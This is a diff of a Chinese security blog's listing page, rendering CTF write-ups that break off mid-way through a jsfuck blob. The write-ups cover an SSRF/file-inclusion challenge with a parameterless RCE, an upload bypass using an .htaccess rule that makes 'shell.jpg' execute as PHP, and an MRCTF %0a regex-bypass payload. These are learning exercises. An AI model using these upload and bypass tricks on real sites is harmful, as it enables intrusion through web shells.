@@ -1,327 +1,2619 @@
 <!DOCTYPE html>
-<html>
-  <head><meta name="generator" content="Hexo 3.9.0">
-<meta name="google-site-verification" content="fQ_tfBgNjE9NQcpKnGAkWapHoKuimF5lVuNuqpPXar0">
-    <meta charset="utf-8">
-    
-    <title>Xiao Leung&#39;s Blog</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-    
-    
-      <link rel="icon" href="/favicon.png">
-    
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
 
-    <link rel="stylesheet" href="/css/style.css">
-
-    <link rel="stylesheet" href="/js/google-code-prettify/tomorrow-night-eighties.min.css">
-    <meta name="description" content="Xiao Leung&#39;s Blog">
-    <meta http-equiv="Content-Language" content="zh-cn">
-  </head>
-
-  <body>
-<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
-<header>
-
-	<a id="logo" href="/" title="Xiao Leung&#39;s Blog">
-	<img src="/favicon.png" alt="Xiao Leung&#39;s Blog"></a>
-	
-	
-		<!--搜索栏-->
-		<i class="js-toggle-search iconfont icon-search"></i>
+<link rel="stylesheet" href="/css/main.css">
 
 
-<form class="js-search search-form search-form--modal" method="get" action="" role="search">
-	<div class="search-form__inner">
-		<div>
-			<i class="iconfont icon-search"></i>
-			<input class="text-input" placeholder="Enter Key..." type="search" name='keys'>
-		</div>
-	</div>
-</form>
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
 
-	
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"www.plasf.cn","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
 
-	
-		<!--侧边导航栏-->
-		<a id="nav-toggle" href="#"><span></span></a>
+  <meta name="description" content="随笔、分享、记录生活">
+<meta name="keywords" content="CTF|网络安全|开发">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Xiao Leung&#39;s Blog">
+<meta property="og:url" content="https://www.plasf.cn/page/3/index.html">
+<meta property="og:site_name" content="Xiao Leung&#39;s Blog">
+<meta property="og:description" content="随笔、分享、记录生活">
+<meta property="og:locale" content="zh-CN">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Xiao Leung&#39;s Blog">
+<meta name="twitter:description" content="随笔、分享、记录生活">
 
-<nav>
-	<div class="menu-top-container">
-		<ul id="menu-top" class="menu">
-			
-				
-				<li class="current-menu-item">
-					<a href="https://www.plasf.cn/articles/d3a8da2734.html" target="_blank">AboutMe</a>
-				</li>
-			
-				
-				<li class="current-menu-item">
-					<a href="" target="_blank">友情链接</a>
-				</li>
-			
-				
-				<li class="current-menu-item">
-					<a href="https://www.redmango.top/" target="_blank">HhhM</a>
-				</li>
-			
-				
-				<li class="current-menu-item">
-					<a href="https://l1near.top/" target="_blank">L1nearのspace</a>
-				</li>
-			
-				
-				<li class="current-menu-item">
-					<a href="https://www.mrskye.cn/" target="_blank">SkYe&#39;s Blog</a>
-				</li>
-			
-				
-				<li class="current-menu-item">
-					<a href="https://www.kawhi.xyz" target="_blank">kawhi</a>
-				</li>
-			
-		</ul>
-	</div>
-</nav>
-	
-
-</header>
-
-<div class="m-header" id="headers" >
-	<section id="hero1" class="hero">
-		<div class="inner">
-		</div>
-	</section>
-	
-		<figure class="top-image" data-enable=true></figure>
-	
-</div>
+<link rel="canonical" href="https://www.plasf.cn/page/3/">
 
 
-<!--文章列表-->
-<div class="wrapper">
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : true,
+    isPost : false,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Xiao Leung's Blog</title>
   
-    <ul class="posts-list mb+ js-posts">
-      
-                <!--<div class="type">
-          <div class="mask">
-            <i class="iconfont"></i>
-          </div>
-          </div>-->
-        <li class="post">
-          
-            <i class="post-status iconfont icon-icon"></i>  
-          
-          <h2 class="no-background"  >
-            <span><a href="/articles/d7163af6f6.html">内部交流小比赛</a></span>
-            <time class="post-time" datetime="2020-04-01T11:24:06.000Z" itemprop="datePublished">2020-04-01</time>
-          </h2>
-        </li>
-      
-                <!--<div class="type">
-          <div class="mask">
-            <i class="iconfont"></i>
-          </div>
-          </div>-->
-        <li class="post">
-          
-          <h2 class="no-background"  >
-            <span><a href="/articles/d3c5fc027b.html">MRCTF WP</a></span>
-            <time class="post-time" datetime="2020-04-01T08:38:18.000Z" itemprop="datePublished">2020-04-01</time>
-          </h2>
-        </li>
-      
-                <!--<div class="type">
-          <div class="mask">
-            <i class="iconfont"></i>
-          </div>
-          </div>-->
-        <li class="post">
-          
-          <h2 class="no-background"  >
-            <span><a href="/articles/d45484efe7.html">YzmCMS-V5.4 后台Getshell</a></span>
-            <time class="post-time" datetime="2019-12-15T14:12:56.000Z" itemprop="datePublished">2019-12-15</time>
-          </h2>
-        </li>
-      
-                <!--<div class="type">
-          <div class="mask">
-            <i class="iconfont"></i>
-          </div>
-          </div>-->
-        <li class="post">
-          
-          <h2 class="no-background"  >
-            <span><a href="/articles/d649bc731c.html">Websocket-php学习笔记</a></span>
-            <time class="post-time" datetime="2019-12-12T03:34:26.000Z" itemprop="datePublished">2019-12-12</time>
-          </h2>
-        </li>
-      
-                <!--<div class="type">
-          <div class="mask">
-            <i class="iconfont"></i>
-          </div>
-          </div>-->
-        <li class="post">
-          
-          <h2 class="no-background"  >
-            <span><a href="/articles/d3e1694f0d.html">Phar反序列化拓展攻击学习笔记</a></span>
-            <time class="post-time" datetime="2019-12-12T03:31:04.000Z" itemprop="datePublished">2019-12-12</time>
-          </h2>
-        </li>
-      
-                <!--<div class="type">
-          <div class="mask">
-            <i class="iconfont"></i>
-          </div>
-          </div>-->
-        <li class="post">
-          
-          <h2 class="no-background"  >
-            <span><a href="/articles/d458a3f373.html">复现强网杯线下赛CSCMS--SSIT模板注入</a></span>
-            <time class="post-time" datetime="2019-11-29T14:22:35.000Z" itemprop="datePublished">2019-11-29</time>
-          </h2>
-        </li>
-      
-                <!--<div class="type">
-          <div class="mask">
-            <i class="iconfont"></i>
-          </div>
-          </div>-->
-        <li class="post">
-          
-          <h2 class="no-background"  >
-            <span><a href="/articles/d68bf56e4f.html">红帽杯线下部分 writeup</a></span>
-            <time class="post-time" datetime="2019-11-22T14:28:47.000Z" itemprop="datePublished">2019-11-22</time>
-          </h2>
-        </li>
-      
-                <!--<div class="type">
-          <div class="mask">
-            <i class="iconfont"></i>
-          </div>
-          </div>-->
-        <li class="post">
-          
-          <h2 class="no-background"  >
-            <span><a href="/articles/d7cc8e3b98.html">Volatility内存取证学习-复盘红帽杯Advertising for Marriage</a></span>
-            <time class="post-time" datetime="2019-11-14T14:17:16.000Z" itemprop="datePublished">2019-11-14</time>
-          </h2>
-        </li>
-      
-                <!--<div class="type">
-          <div class="mask">
-            <i class="iconfont"></i>
-          </div>
-          </div>-->
-        <li class="post">
-          
-          <h2 class="no-background"  >
-            <span><a href="/articles/d711660d49.html">复现CISCN2019 华北赛区 Day1 Web5]CyberPunk</a></span>
-            <time class="post-time" datetime="2019-11-02T14:28:47.000Z" itemprop="datePublished">2019-11-02</time>
-          </h2>
-        </li>
-      
-                <!--<div class="type">
-          <div class="mask">
-            <i class="iconfont"></i>
-          </div>
-          </div>-->
-        <li class="post">
-          
-          <h2 class="no-background"  >
-            <span><a href="/articles/d51d5193e2.html">上海大学生联赛部分write up</a></span>
-            <time class="post-time" datetime="2019-11-02T14:28:47.000Z" itemprop="datePublished">2019-11-02</time>
-          </h2>
-        </li>
-      
-    </ul>
-    
-      <div class="pagination mb+ js-pagination">
-        <div class="js-next pagination__load">
-            <a href="/page/4/"><i class="iconfont icon-next"></i></a></div>
-        </div>
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
     </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Xiao Leung's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">专注网络安全研究</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-sitemap">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
     
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content index posts-expand">
+            
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d7163af6f6.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/header.jpg">
+      <meta itemprop="name" content="XiaoLeung">
+      <meta itemprop="description" content="随笔、分享、记录生活">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xiao Leung's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/articles/d7163af6f6.html" class="post-title-link" itemprop="url">内部交流小比赛</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-04-01 19:24:06" itemprop="dateCreated datePublished" datetime="2020-04-01T19:24:06+08:00">2020-04-01</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-10-14 17:12:56" itemprop="dateModified" datetime="2020-10-14T17:12:56+08:00">2020-10-14</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF比赛/" itemprop="url" rel="index"><span itemprop="name">CTF比赛</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>478</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>1 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="top-3-mountains-WP"><a href="#top-3-mountains-WP" class="headerlink" title="top 3 mountains WP"></a>top 3 mountains WP</h1><h2 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h2><ul>
+<li><p>首先给出界面输入one时候会显示一张图片，可以猜测是文件包含或者ssrf?</p>
+</li>
+<li><p>一开始猜测是：</p>
+</li>
+</ul>
+<pre><code class="php">  inlude(&quot;tour/&quot;$num.&quot;.php&quot;）            </code></pre>
+<ul>
+<li>但是这样这道题没意义了，所以必定是ssrf，输入/etc/passwd有回显。直接上fuzz看看。</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20200402/15857612653555.png" alt="img"></p>
+<ul>
+<li>直接跑出日志文件。看看出题人之前的操作。找出关键文件。</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20200402/15857613447154.png" alt="img"></p>
+<ul>
+<li>直接有源码，无参数RCE，过滤了dir所以以前构造基本没戏，直接用SESSIONID去构造参数。</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20200402/15857613861725.png" alt="img"></p>
+<ul>
+<li>getflag</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20200402/1585761521936.png" alt="img"></p>
+<h2 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h2><p>读取index.php源码</p>
+<pre><code>hhhm://redmango.top/../../index.php</code></pre><h1 id="Upload-WP"><a href="#Upload-WP" class="headerlink" title="Upload WP"></a>Upload WP</h1><p>扫描器一把梭出来<code>upload.html</code></p>
+<p>随便上传个文件，黑名单，直接hatccess。</p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20200402/15857972207333.png" alt="img"></p>
+<ul>
+<li>直接hatccess</li>
+</ul>
+<pre><code>&lt;FilesMatch &quot;shell.jpg&quot;&gt;
+    SetHandler application/x-httpd-php
+  &lt;/FilesMatch&gt;</code></pre><p><strong><img src="http://goodcheerleung.gitee.io/mycute/20200402/15857974174812.png" alt="img"></strong></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20200402/15857987303976.png" alt="img"></p>
+<p>换位密码：</p>
+<p>flag{htACceSs_fI1E_29uP1oAd666}</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d3c5fc027b.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/header.jpg">
+      <meta itemprop="name" content="XiaoLeung">
+      <meta itemprop="description" content="随笔、分享、记录生活">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xiao Leung's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/articles/d3c5fc027b.html" class="post-title-link" itemprop="url">MRCTF WP</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-04-01 16:38:18" itemprop="dateCreated datePublished" datetime="2020-04-01T16:38:18+08:00">2020-04-01</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-10-14 17:14:00" itemprop="dateModified" datetime="2020-10-14T17:14:00+08:00">2020-10-14</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF比赛/" itemprop="url" rel="index"><span itemprop="name">CTF比赛</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>18k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>16 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="套娃"><a href="#套娃" class="headerlink" title="套娃"></a>套娃</h2><ul>
+<li>index注释源码</li>
+</ul>
+<pre><code class="php">  $query = $_SERVER[&#39;QUERY_STRING&#39;];
+
+   if( substr_count($query, &#39;_&#39;) !== 0 || substr_count($query, &#39;%5f&#39;) != 0 ){
+      die(&#39;Y0u are So cutE!&#39;);
+  }
+   if($_GET[&#39;b_u_p_t&#39;] !== &#39;23333&#39; &amp;&amp; preg_match(&#39;/^23333$/&#39;, $_GET[&#39;b_u_p_t&#39;])){
+      echo &quot;you are going to the next ~&quot;;
+  }</code></pre>
+<ul>
+<li><p>代码首先是对字符串的下划线进行统计，若大于0就直接die掉</p>
+</li>
+<li><p>而在下面需要接收一个叫b_u_p_t这个参数，而且它不能等于23333而正则匹配却要有23333这里有个小trick就是%0a可以绕过。而php参数，空格和点都会变成下划线_.</p>
+</li>
+<li><p>pyload</p>
+</li>
+</ul>
+<pre><code>  http://ecf196f2-c27e-427a-aecc-31e4ee6a3a28.merak-ctf.site/?b.u.p.t=23333%0a</code></pre><ul>
+<li><p>得到secrettw.php文件名</p>
+</li>
+<li><p>右键看源码存在一个jsfuck</p>
+</li>
+</ul>
+<pre><code class="js">  &lt;!--
+  [][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][[]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[!+[]+!+[]]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(